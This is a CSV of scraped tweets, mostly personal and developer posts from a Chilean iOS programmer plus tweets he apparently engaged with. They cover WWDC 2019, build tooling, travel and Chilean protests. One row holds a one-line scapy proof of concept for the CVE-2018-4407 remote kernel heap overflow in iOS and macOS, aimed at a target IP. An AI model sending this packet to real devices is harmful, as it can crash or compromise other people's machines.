Name,Handle,Timestamp,Verified,Content,Comments,Retweets,Likes,Analytics,Tags,Mentions,Emojis,Profile Image,Tweet Link,Tweet ID
Alberto M. Lagos T.,@nexon,2019-11-01T02:45:50.000Z,False,Nice!,0,0,1,0,[],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1190097589544333312,tweet_id:1190097589544333312
Andrónico Luksic C.,@aluksicc,2019-10-22T21:05:09.000Z,True,,5.7K,13K,30K,0,[],[],[],https://pbs.twimg.com/profile_images/1195818529305628673/A_In_qfO_normal.jpg,https://x.com/aluksicc/status/1186750362084085766,tweet_id:1186750362084085766
Claudio Bravo Muñoz,@C1audioBravo,2019-10-19T14:25:33.000Z,True,"Vendieron a los privados nuestra agua, luz, gas, educación, salud, jubilación, medicamentos, nuestros caminos, bosques, el salar de Atacama, los glaciares, el transporte. Algo más? No será mucho  No queremos un Chile de algunos pocos. Queremos un Chile de todos  
Basta ",5.4K,44K,99K,0,[],[],"['\\U0001f914', '\\u2665\\ufe0f', '\\U0001f1e8\\U0001f1f1', '\\U0001f6d1', '\\u270b\\U0001f3fb']",https://pbs.twimg.com/profile_images/1388266790678147072/LXV5kayE_normal.jpg,https://x.com/C1audioBravo/status/1185562636156583936,tweet_id:1185562636156583936
Lily Pérez SM,@lilyperez,2019-10-19T18:42:04.000Z,False,"Presidente  : Congele alza transporte metro Ahora! Baje rentabilidad de las eléctricas al 6% no mantengan 10% renta asegurada, estudio está listo en consejo nacional energía año 2016. Contribuciones exentas a tercera edad; Es un impuesto q no se justifica! #corta",604,4.2K,8.9K,0,['#corta'],['@sebastianpinera'],[],https://pbs.twimg.com/profile_images/1677092912004202496/O-IGzJ65_normal.jpg,https://x.com/lilyperez/status/1185627190332923904,tweet_id:1185627190332923904
Alberto M. Lagos T.,@nexon,2019-10-11T21:56:31.000Z,False,James Spader es el puto amo,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1182777020083855363,tweet_id:1182777020083855363
Alberto M. Lagos T.,@nexon,2019-10-07T14:00:15.000Z,False,"Finalmente IT tuvo que formatear mi  mac dado que dejé la caga actualizando (sobreescribiendo, sin querer) clang. Pa la otra más Vivaldi y menos Pavarotti",0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1181207613725462529,tweet_id:1181207613725462529
Alyssa Milano,@Alyssa_Milano,2019-10-04T01:15:59.000Z,True,Smart cat.,104,298,1.7K,0,[],[],[],https://pbs.twimg.com/profile_images/1133750033201762304/oUtQz2nO_normal.jpg,https://x.com/Alyssa_Milano/status/1179928117294465024,tweet_id:1179928117294465024
Alberto M. Lagos T.,@nexon,2019-10-02T17:20:42.000Z,False,Próximamente tendré que dar un LL. y ya tengo tema.  El título será “How to be lazy and achieve something”,0,0,1,0,[],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1179446118419238914,tweet_id:1179446118419238914
Alberto M. Lagos T.,@nexon,2019-09-30T17:39:02.000Z,False,El Viernes instalé en el mac de la empresa LLVM latest (10). Pensé que le había cambiado el directorio de instalación (CMAKE_INSTALL_PREFIX). Y ahora no puedo compilar nada para iOS ,1,0,0,0,[],[],['\\U0001f44d'],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1178725955029864448,tweet_id:1178725955029864448
Meeting C++,@meetingcpp,2019-09-25T11:31:05.000Z,False,Understanding Insertion Sort for coding interviewshttps://acodersjourney.com/insertion-sort/#cpp#cplusplus,0,5,11,0,"['#cpp', '#cplusplus']",[],[],https://pbs.twimg.com/profile_images/499913018361131009/4AYspJ8L_normal.png,https://x.com/meetingcpp/status/1176821418358693898,tweet_id:1176821418358693898
Alberto M. Lagos T.,@nexon,2019-09-25T22:09:50.000Z,False,Ok. Esta es la cosa. Estaba configurando ayer los pipelines de bit bucket con mi proyecto para que corriera SQ. y fallaba a cada rato. Me di por vencido. Y hoy me di cuenta que fallaba porque trata de correr en linux el wrapper para macOS ,0,0,0,0,[],[],['\\U0001f926\\u200d\\u2642\\ufe0f'],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1176982165181075456,tweet_id:1176982165181075456
Alberto M. Lagos T.,@nexon,2019-09-10T00:18:16.000Z,False,Baje la serie de Mr. Mercedes (AT&T). Me decepcionó. Esperaba mas (y eso que vi solo el episodio 1).,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1171216280889765895,tweet_id:1171216280889765895
Alberto M. Lagos T.,@nexon,2019-09-09T01:12:05.000Z,False,Hodges me dejo con ganas de seguir leyendo. Aunque el instituto igual se ve bastante bien.,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1170867438579265536,tweet_id:1170867438579265536
Alberto M. Lagos T.,@nexon,2019-09-08T17:11:05.000Z,False,"Now, i need to reduce the warning . There is a lot of warning due to the cxx flags.",0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1170746390894563328,tweet_id:1170746390894563328
Alberto M. Lagos T.,@nexon,2019-09-08T17:05:02.000Z,False,I don't feel proud of having 0.0% of coverage. It's only that I still do not configure well the project. At least Bugs and CS are pretty accurate.,0,0,1,0,[],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1170744867351343105,tweet_id:1170744867351343105
Alberto M. Lagos T.,@nexon,2019-09-08T16:52:40.000Z,False,Nice I have been reduce my tech debt from 15 days to 8. And also reduce the bugs from 16 to 6.... but only because SQ is excluding some third party code :D,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1170741753575608320,tweet_id:1170741753575608320
Alberto M. Lagos T.,@nexon,2019-09-08T16:26:35.000Z,False,Oh man... i enabled the cxx flags... a lot of warnings :O,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1170735192601968642,tweet_id:1170735192601968642
Alberto M. Lagos T.,@nexon,2019-07-12T18:13:14.000Z,False,Thanks for the stickers  !,0,0,2,0,[],['@git_fork'],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1149743536037871618,tweet_id:1149743536037871618
Alberto M. Lagos T.,@nexon,2019-06-19T00:59:16.000Z,False,https://youtu.be/fa5p19APgd8,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1141148408281018369,tweet_id:1141148408281018369
Simone Giertz,@SimoneGiertz,2019-06-18T15:09:26.000Z,True,How we built it: https://youtu.be/jKv_N0IDS2AAlso hi ,128,780,6.6K,0,[],['@elonmusk'],[],https://pbs.twimg.com/profile_images/820864074577645568/Kr_wKdtf_normal.jpg,https://x.com/SimoneGiertz/status/1140999970360717313,tweet_id:1140999970360717313
Bryan Jones,@bdkjones,2019-06-17T01:18:40.000Z,False,"Well, this is certainly a reply:",9,47,235,0,[],[],[],https://pbs.twimg.com/profile_images/825987506814398464/rVH6wAHA_normal.jpg,https://x.com/bdkjones/status/1140428513377316866,tweet_id:1140428513377316866
эчпочмак и комбикорм,@kocizum,2019-06-14T19:29:05.000Z,False,,3.8K,103K,188K,0,[],[],[],https://pbs.twimg.com/profile_images/1534165392750411782/o3IW8VG4_normal.jpg,https://x.com/kocizum/status/1139615763336171525,tweet_id:1139615763336171525
Sera♪,@Seraxiz,2019-06-12T14:47:42.000Z,False,omg what ,7,466,1K,0,[],['@freezydorito'],[],https://pbs.twimg.com/profile_images/1325233006609649667/WWD8BL_W_normal.jpg,https://x.com/Seraxiz/status/1138820174893715456,tweet_id:1138820174893715456
Alberto M. Lagos T.,@nexon,2019-06-08T00:51:14.000Z,False,#wwdc2019 finished! What an amazing week! @ San Jose Convention Center https://instagram.com/p/BybeZ0BJCAi/?igshid=1xcu5gx6viy8m…,0,0,0,0,['#wwdc2019'],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1137160118548783105,tweet_id:1137160118548783105
Alberto M. Lagos T.,@nexon,2019-06-08T00:49:56.000Z,False,#wwdc2019 finished! What an amazing week! @ San Jose Convention Center https://instagram.com/p/BybeQR3p2M0/?igshid=1ig05l8f8kfby…,0,0,0,0,['#wwdc2019'],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1137159790390632449,tweet_id:1137159790390632449
Srinivasan Sankar,@srinisankar,2019-06-07T11:56:23.000Z,False,What  and  have in common #WWDC #WWDC19 #WWDC2019,0,1,0,0,"['#WWDC', '#WWDC19', '#WWDC2019']","['@Apple', '@IKEAUSA']","['\\U0001f609', '\\U0001f609', '\\U0001f609']",https://pbs.twimg.com/profile_images/1611641110031654914/me0ON45j_normal.jpg,https://x.com/srinisankar/status/1136965121400590336,tweet_id:1136965121400590336
Alberto M. Lagos T.,@nexon,2019-06-07T16:00:17.000Z,False,Building customs views with SwiftUI,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1137026501222682625,tweet_id:1137026501222682625
Alberto M. Lagos T.,@nexon,2019-06-07T00:00:45.000Z,False,iPad -> Mac #WWDC,0,0,0,0,['#WWDC'],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1136785025809076224,tweet_id:1136785025809076224
Alberto M. Lagos T.,@nexon,2019-06-06T21:00:39.000Z,False,Combine,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1136739702814285824,tweet_id:1136739702814285824
Alberto M. Lagos T.,@nexon,2019-06-05T20:57:13.000Z,False,Ready for the session,0,0,1,0,[],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1136376449466740737,tweet_id:1136376449466740737
Alberto M. Lagos T.,@nexon,2019-06-04T19:55:02.000Z,False,Modernizing Medicine at #wwdc2019 @ San Jose Convention Center https://instagram.com/p/ByTOIJjpshS/?igshid=oht66mhruz5c…,0,0,0,0,['#wwdc2019'],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1135998415421075456,tweet_id:1135998415421075456
Nate Cook,@nnnnnnnn,2019-06-04T04:35:24.000Z,False,Hi I am twelve years old,11,27,261,0,[],[],[],https://pbs.twimg.com/profile_images/875563148496879616/8tIboYsW_normal.jpg,https://x.com/nnnnnnnn/status/1135766980751847424,tweet_id:1135766980751847424
Kaji | 火事,@LoloFennec,2019-05-25T16:04:46.000Z,False,"SOMEONE ON FACEBOOK USED THAT SNAPCHAT FILTER ON THEIR CAT

I CANNOT BREATHE ",1.4K,89K,293K,0,[],[],"['\\U0001f923', '\\U0001f923', '\\U0001f923']",https://pbs.twimg.com/profile_images/1834120874552692736/vB2xw9qN_normal.jpg,https://x.com/LoloFennec/status/1132316585631387648,tweet_id:1132316585631387648
Smashing Magazine,@smashingmag,2019-05-15T11:14:35.000Z,True,"A diagramming model that converts your ascii diagram scribbles into happy little SVGs and uses a combination of characters which are readily available on your keyboard.

↬ Svgbob Editorhttps://ivanceras.github.io/svgbob-editor/",1,18,67,0,[],[],[],https://pbs.twimg.com/profile_images/1669591955653685248/mTxJyTGY_normal.jpg,https://x.com/smashingmag/status/1128619680921473025,tweet_id:1128619680921473025
Alberto M. Lagos T.,@nexon,2019-04-16T00:57:21.000Z,False,Alcance a conocer Notre-Dame  @ Cathédrale Notre-Dame de Paris https://instagram.com/p/BwTA-uKJRYg/?utm_source=ig_twitter_share&igshid=qsu91h66q637…,0,0,0,0,[],[],['\\U0001f603'],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1117955102558568448,tweet_id:1117955102558568448
Treehouse | Learn to code with us!,@treehouse,2019-03-23T13:00:12.000Z,False,,1,19,66,0,[],[],['\\u2705'],https://pbs.twimg.com/profile_images/1765773053609361415/E4OPZdqN_normal.png,https://x.com/treehouse/status/1109439705899249664,tweet_id:1109439705899249664
fahmiツ | check pinned & wishlist our upcoming game,@fahmitsu,2019-03-18T07:26:12.000Z,False,Why UX research is important,211,79K,92K,0,[],[],[],https://pbs.twimg.com/profile_images/1471183680710217730/7AIlivuo_normal.jpg,https://x.com/fahmitsu/status/1107543711469072384,tweet_id:1107543711469072384
Alberto M. Lagos T.,@nexon,2019-03-21T17:19:19.000Z,False,WWDC 2019 aquí vamos!,0,0,4,0,[],[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1108780138714546178,tweet_id:1108780138714546178
Alberto M. Lagos T.,@nexon,2019-03-17T16:15:31.000Z,False,Hey  I bought a while ago pictos redux (2015). I’m trying to download it. But I can’t. Any idea how I can get it again?,0,0,1,0,[],['@drewwilson'],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1107314530525302784,tweet_id:1107314530525302784
Changelog,@changelog,2019-03-07T04:24:48.000Z,True,“This technical debt can wait. I have a feature to deliver!”,65,3.4K,7.1K,0,[],[],[],https://pbs.twimg.com/profile_images/1199065640331595776/BNCgPsAw_normal.jpg,https://x.com/changelog/status/1103511794855936000,tweet_id:1103511794855936000
Phillip Caudell,@phillipcaudell,2019-02-28T11:26:36.000Z,False,The CEO of  on Slack: “Why aren’t you working on weekends?” ,242,2.3K,2.5K,0,[],['@RevolutApp'],['\\U0001f6ae'],https://pbs.twimg.com/profile_images/1497243727647105025/sP9gPwjP_normal.jpg,https://x.com/phillipcaudell/status/1101081229351415808,tweet_id:1101081229351415808
Alberto M. Lagos T.,@nexon,2019-02-15T19:24:56.000Z,False,Switch te ganaste mi corazón ,0,0,0,0,[],[],['\\U0001f493'],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1096490562683842560,tweet_id:1096490562683842560
Swift Language,@SwiftLang,2019-02-11T18:00:44.000Z,False,Read about how Swift will evolve after ABI stability:,1,105,218,0,[],[],[],https://pbs.twimg.com/profile_images/1336716675287113728/woTnm-UB_normal.jpg,https://x.com/SwiftLang/status/1095019819546566656,tweet_id:1095019819546566656
Apress,@Apress,2019-02-11T20:15:09.000Z,True,"Read on our site about the new book ""Machine Learning and AI for Healthcare"" by , and the fascinating implications of this line of research! #AI #machinelearning #healthcarehttps://apress.com/us/machine-learning-and-ai-for-healthcare/16375276…",0,6,3,0,"['#AI', '#machinelearning', '#healthcare']",['@arjunpanesar'],[],https://pbs.twimg.com/profile_images/1143172110/NewApressLogo_300x300_normal.jpg,https://x.com/Apress/status/1095053648885923841,tweet_id:1095053648885923841
John Sundell,@johnsundell,2019-02-10T13:32:56.000Z,False,"This week’s article: “Reflection in Swift” In what ways is dynamically iterating over the members of a type useful, and how can it let us automate some of our operations, and make our code more robust in the process? Well, let’s find out! ",5,22,95,0,[],[],"['\\U0001f680', '\\U0001f914', '\\U0001f600']",https://pbs.twimg.com/profile_images/855170244469542915/qdlnkTq-_normal.jpg,https://x.com/johnsundell/status/1094590037335904257,tweet_id:1094590037335904257
PSPDFKit,@PSPDFKit,2019-02-04T15:45:00.000Z,True," Today on the blog, Oscar outlines how we handle documentation for our iOS products and shows how you can leverage the same techniques we’re using to make your life easier. https://pspdfkit.com/blog/2019/writing-and-maintaining-good-code-documentation/…",0,1,0,0,[],[],['\\U0001f4cb'],https://pbs.twimg.com/profile_images/1375123646994391048/bEmqVnW7_normal.jpg,https://x.com/PSPDFKit/status/1092448948873322496,tweet_id:1092448948873322496
Apress,@Apress,2019-02-02T13:55:06.000Z,True,"If you're interested in how machine learning can be used to develop intelligence about healthcare and help it improve, 's forthcoming Apress release should be at the top of your list. Available for pre-order now! #AI #machinelearninghttps://amazon.com/Machine-Learning-AI-Healthcare-Improved/dp/1484237986…",0,1,2,0,"['#AI', '#machinelearning']",['@arjunpanesar'],[],https://pbs.twimg.com/profile_images/1143172110/NewApressLogo_300x300_normal.jpg,https://x.com/Apress/status/1091696513317855232,tweet_id:1091696513317855232
MindNode,@mindnode,2019-01-21T16:38:28.000Z,False,"Do you like the floating Panel in MindNode for iOS? We have just open sourced Aiolos, the component that drives it all.https://github.com/IdeasOnCanvas/Aiolos…",5,65,296,0,[],[],[],https://pbs.twimg.com/profile_images/1813581549029265408/2NRE6H-Q_normal.jpg,https://x.com/mindnode/status/1087388974279258119,tweet_id:1087388974279258119
Chris Lattner,@clattner_llvm,2019-01-07T21:31:44.000Z,True,Congrats to LLVM Weekly - its such a great resource for the compiler community! ,0,7,72,0,[],[],['\\u2699\\ufe0f'],https://pbs.twimg.com/profile_images/1484209565788897285/1n6Viahb_normal.jpg,https://x.com/clattner_llvm/status/1082389346655694848,tweet_id:1082389346655694848
Daniel Benneworth-Gray,@gray,2019-01-01T00:47:20.000Z,False,There are no more twentieth century children.,310,11K,30K,0,[],[],[],https://pbs.twimg.com/profile_images/1810412803779690496/4RhoDjAk_normal.jpg,https://x.com/gray/status/1079901854643965953,tweet_id:1079901854643965953
9GAG Memeland,@9GAG,2018-11-07T01:41:53.000Z,True,"Someone is doing their job right

By ",35,6.2K,11K,0,[],['@nutchlimited'],[],https://pbs.twimg.com/profile_images/1695636573294125056/Jj9IWW10_normal.jpg,https://x.com/9GAG/status/1059984250127011840,tweet_id:1059984250127011840
Media Temple,@mediatemple,2018-11-07T00:20:00.000Z,False,"IaC has been around for 10+ years, and it’s found its biggest benefits on the #cloud, because unlike in a traditional data center, resources in the cloud are made to be ephemeral disposable.

A few more of our favorite #IaC benefits?  Version Control and Configuration Management:",0,1,1,0,"['#cloud', '#IaC']",[],[],https://pbs.twimg.com/profile_images/1278448680220200960/YgLSiEZ4_normal.png,https://x.com/mediatemple/status/1059963643125673984,tweet_id:1059963643125673984
Zuk,@ihackbanme,2018-11-01T01:50:00.000Z,True,"iOS 12 / OS X *Remote Kernel Heap Overflow (CVE-2018-4407) POC* in a tweet:
pip install scapy
sudo scapy 
send(IP(dst=“Target IP“,options=[IPOption(“A”*8)])/TCP(dport=2323,options=[(19, “1""*18),(19, “2”*18)]))",31,838,1.6K,0,[],[],[],https://pbs.twimg.com/profile_images/1783687030054207488/By15sA3Y_normal.jpg,https://x.com/ihackbanme/status/1057811965945376768,tweet_id:1057811965945376768
Alberto M. Lagos T.,@nexon,2018-10-22T21:43:13.000Z,False,"Rao  @ Chicureo, Region Metropolitana, Chile https://instagram.com/p/BpQDpOoBFah/?utm_source=ig_twitter_share&igshid=f0wma14s9pdm…",0,0,0,0,[],[],['\\u2764\\ufe0f'],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1054488368116047872,tweet_id:1054488368116047872
Alberto M. Lagos T.,@nexon,2018-10-19T07:22:33.000Z,False,#louvre #louvremuseum #louvrepyramid #paris #france #francia #joconda #monalisa #monisaniunbrillo @ Musée du Louvre https://instagram.com/p/BpGyxEnBUx6/?utm_source=ig_twitter_share&igshid=1a3o3eptcvg4w…,0,0,0,0,"['#louvre', '#louvremuseum', '#louvrepyramid', '#paris', '#france', '#francia', '#joconda', '#monalisa', '#monisaniunbrillo']",[],['\\U0001f1eb\\U0001f1f7'],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1053184614372728833,tweet_id:1053184614372728833
Alberto M. Lagos T.,@nexon,2018-10-18T19:11:58.000Z,False,#eiffeltower #eiffel #paris #france #trip @ Effile Tower Paris https://instagram.com/p/BpFfJzeiB_1/?utm_source=ig_twitter_share&igshid=1f4e19ekfh3zu…,0,0,0,0,"['#eiffeltower', '#eiffel', '#paris', '#france', '#trip']",[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1053000753487511552,tweet_id:1053000753487511552
DHH,@dhh,2018-10-18T16:25:41.000Z,True,"I have a particular disdain for “software architects” who don’t actually program. Building software is very little like building houses. The constant (and fawning) comparisons do us a serious disservice. Software architecture is leading by example, not decrees.",76,594,1.8K,0,[],[],[],https://pbs.twimg.com/profile_images/1746980162607140864/fG9Fj4K__normal.jpg,https://x.com/dhh/status/1052958907063263232,tweet_id:1052958907063263232
Alberto M. Lagos T.,@nexon,2018-10-18T10:18:36.000Z,False,Le papu le mato le guau #paris #france #arctriomphe #europe @ Arc de Triomphe https://instagram.com/p/BpEiHeTiHTT/?utm_source=ig_twitter_share&igshid=1rxeke3l9a3f9…,0,0,0,0,"['#paris', '#france', '#arctriomphe', '#europe']",[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1052866529895755777,tweet_id:1052866529895755777
Alberto M. Lagos T.,@nexon,2018-10-17T10:38:37.000Z,False,The best! #delmoro #venezia #italy @ Dal Moro's Fresh Pasta To Go - Venice https://instagram.com/p/BpB_nZ9BK3B/?utm_source=ig_twitter_share&igshid=1tt1ftybw4124…,0,0,0,0,"['#delmoro', '#venezia', '#italy']",[],[],https://pbs.twimg.com/profile_images/797822493763444736/GNULxiKE_normal.jpg,https://x.com/nexon/status/1052509176818278400,tweet_id:1052509176818278400
